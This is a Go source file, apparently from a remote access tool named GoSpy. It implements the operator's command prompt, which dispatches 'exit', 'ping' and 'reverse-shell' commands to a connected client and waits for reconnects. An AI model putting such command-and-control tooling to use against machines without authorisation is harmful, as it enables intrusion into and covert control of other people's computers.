package serverprompt

import (
	"fmt"
	"github.com/psidex/GoSpy/internal/gospyserver/client"
	"io"
	"net"
	"os"
	"strings"
)

// Executor is the executor function for the go-prompt prompt.
func Executor(spyClient client.GoSpyClient, in string) {
	in = strings.TrimSpace(in)
	blocks := strings.Split(in, " ")

	var err error // So the it can be inspected after the switch.

	switch blocks[0] {

	case "exit":
		_ = spyClient.CommandExit()
		os.Exit(0)

	case "ping":
		var resp string
		resp, err = spyClient.CommandPing()
		if err != nil {
			fmt.Printf("CommandPing error: %s\n", err.Error())
			break
		}
		fmt.Printf("Recv: %s\n", resp)

	case "reverse-shell":
		err = spyClient.CommandReverseShell()
		if err != nil {
			fmt.Printf("Reverse shell error: %s\n", err.Error())
		}

	}

	if _, isNetErr := err.(net.Error); isNetErr == true || err == io.EOF {
		fmt.Println("\nNetwork error detected, dropping client and waiting for reconnect...")
		_ = spyClient.Close()
		spyClient.WaitForClient()
		fmt.Println("Successful reconnect from client")
	}
}
